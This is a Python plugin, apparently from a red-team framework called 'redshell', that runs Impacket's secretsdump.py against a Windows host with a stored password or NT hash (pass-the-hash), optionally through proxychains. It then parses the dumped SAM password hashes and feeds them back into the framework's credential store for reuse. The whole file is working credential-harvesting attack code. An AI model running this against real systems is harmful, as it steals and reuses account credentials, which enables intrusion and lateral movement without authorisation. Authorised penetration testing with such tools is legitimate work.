from datetime import datetime
from redshell.output_formatter import print_success, print_running, print_fail
from redshell.methods.builtins import BuiltinBase

class Secretsdump(BuiltinBase):
    NAME = "secretsdump"
    META = "Runs Impacket's secretsdump.py with current credentials"
    TARGET_OS = ["Windows"]
    OPTIONS = None

    def __init__(self, method) -> None:
        self.method = method

    def run(self, **_):
        # Confirm command before executing
        if self.method.cred.ctype == "password":
            secretsdump_command = f"python /usr/bin/secretsdump.py {self.method.cred.username}:{self.method.cred.cred}@{self.method.ip_addr}"
        elif self.method.cred.ctype == "nthash":
            secretsdump_command = f"python /usr/bin/secretsdump.py -hashes :{self.method.cred.cred} {self.method.cred.username}@{self.method.ip_addr}"

        # Set for proxychains
        if self.method.tunnel is not None:
            secretsdump_command = f"proxychains {secretsdump_command}"

        print()
        print_running(f"About to execute '{secretsdump_command}'")
        proceed = input("Execute? (y/N) ")
        if proceed != 'y':
            return

        self.cmd_time = datetime.now().strftime("%Y%m%d-%H%M%S")
        output = self.method.client.containers.run(
            self.method.docker_tag,
            secretsdump_command,
            remove=True,
            volumes={self.method.collect_path: {"bind": "/data", "mode": "rw"}},
        )
        self.output = output.decode().strip()

        # Write output to terminal
        print(self.output)
        self.write_to_file()

    def write_to_file(self):
        # Run standard method first
        super().write_to_file()
        
        self.parse_output()

    def parse_output(self):
        # Parse secretsdump output and add to credentials
        print()
        output_list = self.output.split("\n")
        sam_hash_start = "[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)"

        record = False
        sam_hashes = []
        for line in output_list:
            if record == False:
                if line == sam_hash_start:
                    record = True
            else:
                if not line.startswith("[*]"):
                    sam_hashes.append(line)
                else:
                    record = False
        
        for line in sam_hashes:
            username, rid, lm_hash, nt_hash = line.split(":")[:4]
            self.method.target.credentials.append(username=username, ctype="nthash", cred=nt_hash, origin=self.method.ip_addr)